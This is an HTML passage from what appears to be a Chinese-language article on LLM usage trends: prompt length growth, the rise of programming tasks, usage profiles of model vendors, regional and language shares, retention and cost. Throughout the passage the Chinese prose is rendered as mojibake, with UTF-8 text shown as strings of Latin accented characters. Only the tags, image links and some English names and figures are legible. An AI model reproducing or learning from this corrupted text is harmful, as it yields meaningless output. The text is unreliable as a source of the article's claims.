<p>å¯¹äºå¼€å‘è€…å’Œä¼ä¸šè€Œè¨€ï¼Œç»“è®ºéå¸¸æ®‹é…·ä¸”ç›´æ¥ï¼š<strong>æ”¯æŒç¨³å®šçš„å·¥å…·è°ƒç”¨å·²ä¸å†æ˜¯é”¦ä¸Šæ·»èŠ±ï¼Œè€Œæ˜¯å¿…é¡»é¡¹ã€‚</strong> åœ¨é«˜ä»·å€¼çš„å¤æ‚å·¥ä½œæµä¸­ï¼Œå¦‚æœæ¨¡å‹ç¼ºä¹å¯é çš„å·¥å…·æ¥å£èƒ½åŠ›ï¼Œå°†åœ¨ä¼ä¸šçº§é‡‡ç”¨å’Œè‡ªåŠ¨åŒ–ç¼–æ’ä¸­è¿…é€Ÿæ‰é˜Ÿã€‚</p>
</li>
</ul>
<h2 data-id="heading-6">ä¸ƒã€æ¨¡å‹è¾“å…¥é•¿åº¦æ˜¾è‘—å¢é•¿</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/19cdad53b0954da29f89a93928e73c0f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765772204&amp;x-signature=YB6rI7pX%2FrXZ0ykycylB4%2FeejTU%3D" alt="" loading="lazy"/></p>
<ul>
<li>
<p>è¿‡å»ä¸€å¹´ï¼Œç”¨æˆ·è¾“å…¥çš„æç¤ºè¯ï¼ˆPromptï¼‰å¹³å‡é•¿åº¦ <strong>ç¿»äº†è¿‘ 4 å€</strong>ï¼ˆä»çº¦ 1.5k æ¶¨è‡³ 6k tokenï¼‰ï¼Œè€Œæ¨¡å‹è¾“å‡ºçš„é•¿åº¦è™½ç„¶ä¹Ÿå¢åŠ äº† 3 å€ï¼ˆä¸»è¦å½’å› äºæ¨ç†è¿‡ç¨‹ï¼‰ï¼Œä½†ç»å¯¹å€¼ä¾ç„¶è¾ƒå°ã€‚è¿™è¯´æ˜ç°åœ¨çš„äº¤äº’æ¨¡å¼æ˜¯â€œå–‚ç»™æ¨¡å‹å¤§é‡ä¿¡æ¯ï¼Œæ¢å–ç²¾ç‚¼çš„é«˜ä»·å€¼æ´å¯Ÿâ€ã€‚</p>
</li>
<li>
<p>è¿™ç§æ•°æ®å½¢æ€çš„å˜åŒ–åæ˜ äº†æ¨¡å‹è§’è‰²çš„æ ¹æœ¬æ€§è½¬ç§»ã€‚AI ä¸å†åªæ˜¯å‡­ç©ºâ€œå†™ä½œæ–‡â€çš„ç”Ÿæˆå™¨ï¼Œè€Œæ˜¯è¿›åŒ–æˆäº†<strong>åˆ†æå¼•æ“</strong>ã€‚ç°åœ¨çš„å…¸å‹ç”¨æ³•æ˜¯ä¸¢ç»™æ¨¡å‹å¤§é‡çš„ä»£ç åº“ã€æ–‡æ¡£æˆ–é•¿å¯¹è¯è®°å½•ï¼Œè®©å®ƒåœ¨è¿™äº›åºå¤§çš„ä¸Šä¸‹æ–‡ä¸­è¿›è¡Œæ¨ç†å’Œæç‚¼ã€‚</p>
</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a9a9ecfce13b4a1fbf6c8676be489468~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765772204&amp;x-signature=JNYxFH1UnBSY0faFXRZV4GTF98c%3D" alt="" loading="lazy"/></p>
<ul>
<li>è¾“å…¥é•¿åº¦çš„æš´æ¶¨å¹¶éå…¨è¡Œä¸šçš„æ™®éç°è±¡ï¼Œè€Œæ˜¯å‘ˆç°å‡ºæåº¦çš„ä¸å‡è¡¡æ€§ã€‚<strong>ç¼–ç¨‹ç±»ä»»åŠ¡</strong>ï¼ˆå¦‚ä»£ç ç†è§£ã€è°ƒè¯•ï¼‰æ˜¯æ¨é«˜è¾“å…¥é•¿åº¦çš„ç»å¯¹æ ¸å¿ƒé©±åŠ¨åŠ›ï¼Œå…¶è¯·æ±‚å¾€å¾€éœ€è¦å¤„ç†è¶…è¿‡ 2 ä¸‡ä¸ª Token çš„ä¸Šä¸‹æ–‡ã€‚ç›¸æ¯”ä¹‹ä¸‹ï¼Œå…¶ä»–é¢†åŸŸçš„è¾“å…¥é•¿åº¦åˆ™ä¿æŒç›¸å¯¹å¹³ç¨³ã€‚</li>
</ul>
<h2 data-id="heading-7">å…«ã€LLM ç¼–ç¨‹ä»»åŠ¡çš„çˆ†å‘å¼å¢é•¿</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0c95884e5d654eefa2bf52bb46f5d5a2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765772204&amp;x-signature=NpGTcUbbn6uuY9zELSRCPyXtwfU%3D" alt="" loading="lazy"/></p>
<ul>
<li>
<p>å¦‚æœæŠŠè§†é‡ä»å¼€æºæ¨¡å‹æ‰©å¤§åˆ°æ‰€æœ‰ LLMï¼ˆåŒ…å«é—­æºï¼‰ï¼Œ<strong>ç¼–ç¨‹</strong>æ— ç–‘æ˜¯å¢é•¿æœ€å¿«ä¸”æœ€å…·ç»Ÿæ²»åŠ›çš„ç±»åˆ«ã€‚ä» 2025 å¹´åˆä»…å çº¦ 11% çš„ä»½é¢ï¼Œé£™å‡è‡³æœ€è¿‘çš„è¶…è¿‡ 50%ã€‚è¿™è¯´æ˜ AI å·²ç»æ·±åº¦åµŒå…¥åˆ°å†™ä»£ç ã€è°ƒè¯•ç­‰å¼€å‘æµç¨‹ä¸­ï¼Œä¸å†åªæ˜¯é™ªèŠï¼Œè€Œæ˜¯å®æ‰“å®çš„ç”Ÿäº§åŠ›å·¥å…·ã€‚</p>
</li>
<li>
<p>åœ¨ç¼–ç¨‹è¾…åŠ©é¢†åŸŸï¼ŒAnthropic çš„ <strong>Claude ç³»åˆ—</strong> å…·æœ‰ç»å¯¹çš„ç»Ÿæ²»åŠ›ï¼Œé•¿æœŸæŠŠæŒç€è¶…è¿‡ 60% çš„å¸‚åœºä»½é¢ã€‚ä¸è¿‡ï¼Œè¿™ä¸€åœ°ä½è¿‘æœŸæœ‰æ‰€æ¾åŠ¨ï¼ˆé¦–æ¬¡è·Œç ´ 60%ï¼‰ï¼Œæ˜¾ç¤ºå‡ºå¸‚åœºç«äº‰æ­£åœ¨åŠ å‰§ã€‚</p>
</li>
<li>
<p>ç«äº‰æ ¼å±€æ­£åœ¨å‘ç”Ÿå¾®å¦™å˜åŒ–ï¼šOpenAI çš„ä»½é¢ä» 2% ç¼“æ…¢å›å‡è‡³ 8%ï¼ŒGoogle ç¨³å®šåœ¨ 15% å·¦å³ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œ<strong>MiniMax</strong> ç­‰æ–°å…´å‚å•†ä»¥åŠ Qwenã€Mistral ç­‰å¼€æºåŠ›é‡æ­£åœ¨è¿…é€Ÿå´›èµ·ï¼ŒæŠ¢å äº†éƒ¨åˆ†å¼€å‘è€…çš„æ³¨æ„åŠ›ã€‚</p>
</li>
</ul>
<blockquote>
<p>ç¼–ç¨‹ç±»ä»»åŠ¡æ˜¯ç›®å‰äº‰å¤ºæœ€æ¿€çƒˆã€æˆ˜ç•¥æ„ä¹‰æœ€é‡è¦çš„é¢†åŸŸã€‚å¼€å‘è€…å¯¹æ¨¡å‹è´¨é‡æå…¶æ•æ„Ÿï¼Œå¾®å°çš„æ€§èƒ½æˆ–å»¶è¿Ÿå·®å¼‚å°±èƒ½å¯¼è‡´å¸‚åœºä»½é¢çš„å¿«é€Ÿè½¬ç§»ã€‚è¿™å€’é€¼æ‰€æœ‰æ¨¡å‹å‚å•†å¿…é¡»æŒç»­åŠ å¼ºä»£ç è®­ç»ƒæ•°æ®å’Œé€»è¾‘æ¨ç†èƒ½åŠ›ï¼Œè°æ…¢ä¸€æ­¥å°±ä¼šæ‰é˜Ÿã€‚</p>
</blockquote>
<h2 data-id="heading-8">ä¹ã€LLM å…¶ä»–ä»»åŠ¡çš„ç»†åˆ†è¶‹åŠ¿</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f90e67a99f0d425888910d7e72745954~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765772204&amp;x-signature=iptTFL3yLTzjycn26UaUAfHDtjQ%3D" alt="" loading="lazy"/></p>
<ul>
<li>
<p>å¤§å¤šæ•°åº”ç”¨ç±»åˆ«å†…éƒ¨å¹¶éâ€œé›¨éœ²å‡æ²¾â€ï¼Œè€Œæ˜¯å‘ˆç°å‡ºæ˜æ˜¾çš„<strong>å¤´éƒ¨é›†ä¸­æ•ˆåº”</strong>ã€‚ç”¨æˆ·çš„ä½¿ç”¨ä¹ æƒ¯éå¸¸å›ºå®šï¼Œé€šå¸¸èšç„¦åœ¨æ¯ä¸ªå¤§ç±»ä¸‹çš„æŸè¿™ä¸€ä¸¤ä¸ªç‰¹å®šç»†åˆ†åœºæ™¯ä¸­ï¼Œè¿™è¯´æ˜çœŸå®çš„å¸‚åœºéœ€æ±‚å…¶å®æ˜¯éå¸¸å…·ä½“ä¸”æœ‰è¿¹å¯å¾ªçš„ã€‚</p>
</li>
<li>
<p><strong>è§’è‰²æ‰®æ¼”ï¼ˆRoleplayï¼‰ï¼š</strong> ç»éç®€å•çš„é—²èŠã€‚è¿‘ 60% çš„æµé‡é›†ä¸­åœ¨<strong>æ¸¸æˆä¸è·‘å›¢ï¼ˆGames/RPGï¼‰</strong>ï¼ŒåŠ ä¸Šæˆäººå†…å®¹å’Œå†™ä½œèµ„æºï¼Œè¯´æ˜ç”¨æˆ·æ˜¯åœ¨æŠŠ LLM å½“ä½œä¸€ä¸ªç»“æ„åŒ–çš„æ•…äº‹å¼•æ“æˆ–äº’åŠ¨æ¸¸æˆæœºæ¥ç”¨ã€‚</p>
</li>
<li>
<p>ä¸€ä¸ªæœ‰è¶£çš„ç°è±¡æ˜¯ï¼Œåœ¨â€œç§‘å­¦ï¼ˆScienceï¼‰â€è¿™ä¸ªå¤§ç±»ä¸‹ï¼Œç«Ÿç„¶æœ‰ <strong>80.4%</strong> çš„å†…å®¹æ˜¯å…³äº <strong>â€œæœºå™¨å­¦ä¹ ä¸ AIâ€</strong> çš„ã€‚è¿™è¯´æ˜ç›®å‰ç”¨æˆ·ç”¨ AI èŠç§‘å­¦ï¼Œä¸»è¦è¿˜æ˜¯ä¸ºäº†ç ”ç©¶ AI æŠ€æœ¯æœ¬èº«ï¼ˆå¥—å¨ƒäº†ï¼‰ï¼Œè€Œä¸æ˜¯å»æ¢ç´¢ç‰©ç†ã€ç”Ÿç‰©ç­‰ä¼ ç»ŸåŸºç¡€å­¦ç§‘ã€‚</p>
</li>
<li>
<p>ç›¸æ¯”äºç¼–ç¨‹çš„æˆç†Ÿï¼Œ<strong>åŒ»ç–—ã€é‡‘èå’Œæ³•å¾‹</strong>ç­‰ä¸“ä¸šé¢†åŸŸçš„åº”ç”¨æ˜¾å¾—éå¸¸åˆ†æ•£ï¼ˆç¢ç‰‡åŒ–ï¼‰ã€‚åœ¨è¿™äº›é¢†åŸŸä¸­ï¼Œæ²¡æœ‰ä»»ä½•å•ä¸€çš„ç»†åˆ†ç”¨é€”èƒ½å æ®ä¸»å¯¼åœ°ä½ã€‚è¿™æ—¢åæ˜ äº†ä¸“ä¸šé¢†åŸŸéœ€æ±‚çš„å¤æ‚æ€§ï¼Œä¹Ÿæš—ç¤ºäº†ç›®å‰çš„é€šç”¨æ¨¡å‹è¿˜æ²¡èƒ½ä¸ºè¿™äº›è¡Œä¸šæä¾›ä¸€å¥—æ ‡å‡†åŒ–çš„ã€æ€æ‰‹çº§çš„å·¥ä½œæµï¼Œæœªæ¥ä¼˜åŒ–æ½œåŠ›å·¨å¤§ã€‚</p>
</li>
</ul>
<h2 data-id="heading-9">åã€æ¨¡å‹å‚å•†çš„ç”Ÿæ€ç”»åƒ</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/03dbc0d2c1a14edfa8b3f2a80f9b2b11~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765772204&amp;x-signature=esQqdoyjjaEa3cGvvpixPRJ7n7I%3D" alt="" loading="lazy"/></p>
<ul>
<li><strong>Anthropic (Claude)ï¼šæè‡´çš„â€œåç§‘ç”Ÿâ€</strong>
Claude çš„å®šä½éå¸¸æ¸…æ™°ä¸”ç¡¬æ ¸â€”â€”å®ƒå°±æ˜¯ç”Ÿäº§åŠ›å·¥å…·ã€‚<strong>è¶…è¿‡ 80%</strong> çš„æµé‡éƒ½é›†ä¸­åœ¨<strong>ç¼–ç¨‹å’ŒæŠ€æœ¯</strong>ä»»åŠ¡ä¸Šï¼Œç”¨æ¥é—²èŠæˆ–è§’è‰²æ‰®æ¼”çš„æ¯”ä¾‹å¾®ä¹å…¶å¾®ã€‚åœ¨å¼€å‘è€…å’Œä¼ä¸šçœ¼ä¸­ï¼Œå®ƒæ˜¯è§£å†³å¤æ‚é€»è¾‘å’Œå†™ä»£ç çš„é¦–é€‰ã€‚</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c0c1d4cfc43b4ab49ac16f2024d6e00e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765772204&amp;x-signature=I6HyEOvMB5pHVnWmEFXuzfvQHuw%3D" alt="" loading="lazy"/></p>
<ul>
<li><strong>DeepSeek vs. Qwen</strong> è™½ç„¶éƒ½æ˜¯å›½äº§å¼€æºä¹‹å…‰ï¼Œä½†ä¸¤è€…çš„ç”¨æ³•æˆªç„¶ä¸åŒï¼š
<ul>
<li><strong>DeepSeek</strong> ï¼šè¶…è¿‡ä¸‰åˆ†ä¹‹äºŒçš„æµé‡éƒ½ç”¨äº<strong>è§’è‰²æ‰®æ¼”å’Œä¼‘é—²èŠå¤©</strong>ï¼Œä¸»æ‰“é«˜é¢‘äº’åŠ¨çš„ C ç«¯åœºæ™¯ã€‚</li>
<li><strong>Qwen (é€šä¹‰åƒé—®)</strong> ç”»åƒæ›´åƒ Anthropicï¼Œ<strong>40%-60%</strong> çš„æµé‡éƒ½æ˜¯<strong>ç¼–ç¨‹ä»»åŠ¡</strong>ï¼Œæ˜¾ç¤ºå…¶åœ¨æŠ€æœ¯å¼€å‘ç¾¤ä½“ä¸­æœ‰å¾ˆå¼ºçš„æ¸—é€ç‡ã€‚</li>
</ul>
</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a8ceab34eb5a47789864add2879e3dfc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765772204&amp;x-signature=TDOBSQm2FFsZeQh0uh5F1ZzhWSQ%3D" alt="" loading="lazy"/></p>
<ul>
<li>Google æ¨¡å‹çš„ç”¨é€”æœ€æ‚ã€æœ€å®½æ³›ã€‚å®ƒæ¶µç›–äº†æ³•å¾‹ã€ç§‘å­¦ã€ç¿»è¯‘ç­‰å„ç§é•¿å°¾éœ€æ±‚ï¼Œæ›´åƒæ˜¯ä¸€ä¸ª<strong>ç»¼åˆä¿¡æ¯å¼•æ“</strong>ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼ŒGoogle çš„ç¼–ç¨‹ä»½é¢åè€Œåœ¨ä¸‹é™ï¼ˆè·Œè‡³çº¦ 18%ï¼‰ï¼Œè¯´æ˜ç”¨æˆ·æ›´å€¾å‘äºç”¨å®ƒæŸ¥èµ„æ–™è€Œéå†™ä»£ç ã€‚</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f533afe2bab749779c468a49307bb8b0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765772204&amp;x-signature=4ccFlu4cxLeDv7FTip6wtdZoXxI%3D" alt="" loading="lazy"/></p>
<ul>
<li><strong>OpenAI ä¸ xAIï¼šæ­£åœ¨è½¬å‹â€</strong>
<ul>
<li><strong>OpenAI</strong> æ­£åœ¨ä»æ—©æœŸçš„â€œç§‘å­¦é—®ç­”â€å‘â€œå®å¹²â€è½¬å‹ï¼Œç›®å‰ç¼–ç¨‹å’ŒæŠ€æœ¯ä»»åŠ¡å·²å åŠå£æ±Ÿå±±ï¼Œä»‹äº Claude çš„ä¸“ç²¾å’Œ Google çš„åšå­¦ä¹‹é—´ã€‚</li>
<li><strong>xAI</strong> åˆ™ç»å†äº†ä¸€æ¬¡æœ‰è¶£çš„çªå˜ï¼šåŸæœ¬æ˜¯çº¯ç²¹çš„ä»£ç å·¥å…·ï¼ˆç¼–ç¨‹å æ¯”æ›¾è¶… 80%ï¼‰ï¼Œä½†éšç€å…è´¹æ¶ˆè´¹çº§åº”ç”¨çš„æ¨å¹¿ï¼ŒæŠ€æœ¯ã€è§’è‰²æ‰®æ¼”å’Œå­¦æœ¯ç±»æµé‡çªç„¶æ¶Œå…¥ï¼Œç”¨æˆ·ç¾¤æ­£åœ¨ä»çº¯æå®¢å‘å¤§ä¼—æ³›åŒ–ã€‚</li>
</ul>
</li>
</ul>
<blockquote>
<p>æ•°æ®è¯æ˜ï¼Œç›®å‰çš„å¸‚åœºå·²ç»é«˜åº¦åˆ†åŒ–ã€‚ç”¨æˆ·éå¸¸èªæ˜ï¼Œä¼šæ ¹æ®ä»»åŠ¡é€‰æ¨¡å‹ï¼šå†™ä»£ç æ‰¾ Claude/Qwenï¼ŒèŠå¤©æ‰¾ DeepSeekï¼ŒæŸ¥èµ„æ–™æ‰¾ Googleã€‚è¿™å¯¹å¼€å‘è€…æ„å‘³ç€ï¼Œæœªæ¥ä¸å†æ˜¯å•ä¸€æ¨¡å‹çš„å¤©ä¸‹ï¼Œè€Œæ˜¯ <strong>å¤šæ¨¡å‹åä½œ</strong> çš„æ—¶ä»£ã€‚</p>
</blockquote>
<h2 data-id="heading-10">åä¸€ã€LLM å…¨çƒå¸‚åœºçš„åŒºåŸŸä»½é¢ä¸è¯­è¨€åˆ†å¸ƒ</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e5048598f12446f58778da667079174f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765772204&amp;x-signature=gQ9PTnQc8Kryy17ZLaBeAZBrA6o%3D" alt="" loading="lazy"/></p>
<ul>
<li>
<p><strong>åŒ—ç¾ä¸å†â€œä¸€å®¶ç‹¬å¤§â€ï¼Œäºšæ´²æ¶ˆè´¹åŠ›ç¿»å€</strong>
è™½ç„¶åŒ—ç¾ä¾ç„¶æ˜¯å…¨çƒæœ€å¤§çš„ AI æ¶ˆè´¹å¸‚åœºï¼ˆçº¦å  47%ï¼‰ï¼Œä½†å…¶ä»½é¢å·²ä¸è¶³å…¨çƒæ€»æ”¯å‡ºçš„ä¸€åŠã€‚æœ€å¼•äººæ³¨ç›®çš„æ˜¯<strong>äºšæ´²çš„å´›èµ·</strong>ï¼šäºšæ´²ä¸ä»…æ˜¯æ¨¡å‹çš„ç”Ÿäº§åœ°ï¼Œæ›´æ˜¯è¿…çŒ›å¢é•¿çš„æ¶ˆè´¹åœ°ï¼Œå…¶å¸‚åœºä»½é¢ä»æœ€åˆçš„ 13% é£™å‡è‡³ <strong>31%</strong>ï¼Œå®ç°äº†ç¿»å€å¢é•¿ã€‚</p>
</li>
<li>
<p><strong>æ–°åŠ å¡æˆâ€œæ„å¤–é»‘é©¬â€</strong>
åœ¨å…·ä½“å›½å®¶çš„æµé‡æ’åä¸­ï¼Œå‡ºç°äº†ä¸€ä¸ªæœ‰è¶£çš„ç°è±¡ï¼š<strong>æ–°åŠ å¡</strong>ä»¥ 9.21% çš„ä»½é¢è¶…è¶Šäº†å¾·å›½ï¼ˆ7.51%ï¼‰å’Œä¸­å›½ï¼ˆ6.01%ï¼‰ï¼Œé«˜å±…<strong>å…¨çƒç¬¬äºŒ</strong>ï¼Œä»…æ¬¡äºç¾å›½ã€‚è¿™å¯èƒ½åæ˜ äº†å…¶ä½œä¸ºåŒºåŸŸæ•°æ®ä¸­å¿ƒæ¢çº½æˆ–é«˜ç§‘æŠ€ä¼ä¸šèšé›†åœ°çš„ç‰¹æ®Šåœ°ä½ã€‚</p>
</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/093badd0053847b89904f2e9292ec399~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765772204&amp;x-signature=hiboZpF7HusUeYCQNCFJQ31hvQQ%3D" alt="" loading="lazy"/></p>
<ul>
<li><strong>è‹±è¯­ç»å¯¹ä¸»å¯¼ï¼Œä¸­æ–‡ç¨³å±…ç¬¬äºŒ</strong>
åœ¨è¯­è¨€åˆ†å¸ƒä¸Šï¼Œè‹±è¯­ä¾ç„¶å…·æœ‰å‹å€’æ€§ä¼˜åŠ¿ï¼Œå æ®äº†è¶…è¿‡ <strong>80%</strong> çš„ Token æµé‡ã€‚<strong>ç®€ä½“ä¸­æ–‡</strong>ä»¥çº¦ 5% çš„ä»½é¢ä½å±…ç¬¬äºŒï¼Œè¿™ä¸»è¦å¾—ç›Šäº DeepSeekã€Qwen ç­‰å›½äº§å¼€æºæ¨¡å‹çš„å¹¿æ³›åº”ç”¨ã€‚å…¶ä½™å¦‚ä¿„è¯­ã€è¥¿ç­ç‰™è¯­ç­‰è™½ç„¶å æ¯”ä¸é«˜ï¼Œä½†ä¹Ÿæ„æˆäº†é‡è¦çš„é•¿å°¾å¸‚åœºã€‚</li>
</ul>
<blockquote>
<p>å¯¹äºæ¨¡å‹å‚å•†å’ŒåŸºç¡€è®¾æ–½è¿è¥å•†æ¥è¯´ï¼Œä»…å…³æ³¨å•ä¸€å¸‚åœºå·²ä¸å¤Ÿã€‚é¢å¯¹è¿™ç§å…¨çƒåŒ–ä½†åˆé«˜åº¦æœ¬åœ°åŒ–ï¼ˆä¸åŒè¯­è¨€ã€ä¸åŒåˆè§„è¦æ±‚ï¼‰çš„ä½¿ç”¨ä¹ æƒ¯ï¼Œ<strong>è·¨åŒºåŸŸçš„æœåŠ¡èƒ½åŠ›</strong>å·²æˆä¸ºç«äº‰çš„åŸºæœ¬é—¨æ§›ã€‚</p>
</blockquote>
<h2 data-id="heading-11">åäºŒã€ç”¨æˆ·ç•™å­˜ï¼šä»â€œå°é²œâ€åˆ°â€œä¾èµ–â€</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ae4b278bb09e47b19521d8e12590024f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765772204&amp;x-signature=Q0OyUKT1zAL49f2pZLcJ9gn0GRA%3D" alt="" loading="lazy"/></p>
<ul>
<li>
<p><strong>åªæœ‰è§£å†³ç—›ç‚¹ï¼Œæ‰èƒ½â€œé”æ­»â€ç”¨æˆ·</strong>
æ•°æ®æ­ç¤ºäº†ä¸€ä¸ªæ®‹é…·çš„è§„å¾‹ï¼šç”¨æˆ·ä¸ä»…ä»…æ˜¯æ¥â€œç©ç©â€çš„ã€‚åªæœ‰å½“ä¸€ä¸ªæ–°æ¨¡å‹å®Œç¾è§£å†³äº†ç”¨æˆ·ä¹‹å‰è§£å†³ä¸äº†çš„å…·ä½“éš¾é¢˜ï¼ˆæ— è®ºæ˜¯æŠ€æœ¯çªç ´è¿˜æ˜¯æˆæœ¬æä½ï¼‰ï¼Œç”¨æˆ·æ‰ä¼šçœŸæ­£é•¿æœŸç•™ä¸‹æ¥ã€‚ä¸€æ—¦ä¸šåŠ¡è·‘é€šï¼Œç”¨æˆ·ä¸ºäº†ç¨³å®šï¼ŒåŸºæœ¬ä¸ä¼šå†æ¢æ¨¡å‹ã€‚</p>
</li>
<li>
<p><strong>å…ˆå‘ä¼˜åŠ¿å°±æ˜¯ä¸€åˆ‡</strong>
çœŸæ­£å¿ è¯šçš„ç”¨æˆ·ï¼Œå¾€å¾€æ˜¯æ¨¡å‹åˆšå‘å¸ƒæ—¶æœ€æ—©è¿›æ¥çš„é‚£ä¸€æ‰¹ã€‚å› ä¸ºæ¨¡å‹æœ€æ—©å¸®è¿™æ‰¹äººè§£å†³äº†é—®é¢˜ï¼Œä»–ä»¬æŠŠç³»ç»Ÿå’Œä»£ç éƒ½åŸºäºè¿™ä¸ªæ¨¡å‹æ­å¥½äº†ï¼Œè¿ç§»æˆæœ¬å¾ˆé«˜ã€‚åæ¥çš„æ¨¡å‹å³ä½¿æ€§èƒ½å·®ä¸å¤šï¼Œä¹Ÿå¾ˆéš¾å†æŠŠè¿™æ‰¹äººæŠ¢èµ°ã€‚</p>
</li>
<li>
<p><strong>å¹³åº¸çš„æ¨¡å‹ç•™ä¸ä½äºº</strong>
å¦‚æœä¸€ä¸ªæ¨¡å‹å‘å¸ƒæ—¶åªæ˜¯â€œè¿˜è¡Œâ€ã€â€œå¤Ÿç”¨â€ï¼Œè€Œæ²¡æœ‰åœ¨æŸä¸€æ–¹é¢åšåˆ°é¡¶å°–ï¼ˆæ¯”å¦‚ Gemini 2.0 Flash å’Œ Llama 4ï¼‰ï¼Œç»“æœå°±æ˜¯ç¾éš¾æ€§çš„ï¼šç”¨æˆ·è¯•ä¸€ä¸‹å°±å…¨è·‘äº†ï¼Œå®Œå…¨æ— æ³•å½¢æˆç¨³å®šçš„æ ¸å¿ƒç”¨æˆ·ç¾¤ã€‚</p>
</li>
<li>
<p><strong>DeepSeek çš„â€œå›å¤´å®¢â€ç°è±¡</strong>
DeepSeek æœ‰ä¸ªéå¸¸ç‹¬ç‰¹çš„æ•°æ®ç‰¹å¾ï¼šå¾ˆå¤šç”¨æˆ·ä¸€å¼€å§‹æµå¤±äº†ï¼Œä½†è¿‡äº†ä¸€ä¸¤ä¸ªæœˆåˆå›æ¥äº†ã€‚è¿™è¯´æ˜ç”¨æˆ·åœ¨å¯¹æ¯”äº†ä¸€åœˆå…¶ä»–ç«å“åï¼Œå‘ç° DeepSeek åœ¨æ€§ä»·æ¯”æˆ–ç‰¹å®šèƒ½åŠ›ä¸Šä¾ç„¶æ˜¯å¸‚é¢ä¸Šæœ€å¥½çš„é€‰æ‹©ï¼Œåªèƒ½ä¹–ä¹–å›æ¥ç»§ç»­ç”¨ã€‚</p>
</li>
</ul>
<h2 data-id="heading-12">åä¸‰ã€å„ç±» AI ä»»åŠ¡çš„æˆæœ¬ä¸ç”¨é‡åˆ†å¸ƒ</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/51f7f255e7b14a2c9bd8f173837f4b85~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765772204&amp;x-signature=ahghZfolGfnVzOMPN62H1pdiOy0%3D" alt="" loading="lazy"/></p>
<ul>
<li>
<p><strong>ç¼–ç¨‹å’Œè§’è‰²æ‰®æ¼”ï¼šé‡å¤§ä¸”ä¾¿å®œ</strong>
è¿™æ˜¯ç›®å‰ AI æœ€å¤§çš„ä¸¤ä¸ªæµé‡æ± ã€‚å®ƒä»¬çš„ç‰¹ç‚¹æ˜¯ï¼š<strong>æ€»ä½¿ç”¨é‡å·¨å¤§ï¼Œä½†å¹³å‡å•ä»·å¾ˆä½</strong>ï¼ˆé€šå¸¸ä½äºä¸­ä½æ•° 0.73 ç¾å…ƒ/ç™¾ä¸‡ tokenï¼‰ã€‚è¿™è¯´æ˜è¿™ä¸¤ä¸ªé¢†åŸŸå·²ç»éå¸¸æˆç†Ÿä¸”æ™®åŠï¼Œç”¨æˆ·å¯¹ä»·æ ¼æ•æ„Ÿï¼Œå€¾å‘äºä½¿ç”¨ç»è¿‡ä¼˜åŒ–çš„ä½æˆæœ¬æ¨¡å‹ï¼ˆæ¯”å¦‚å¼€æºæ¨¡å‹ï¼‰ã€‚</p>
</li>
<li>
<p><strong>â€œæŠ€æœ¯ç±»â€ä»»åŠ¡ï¼šåˆè´µåˆæœ‰äººç”¨</strong>
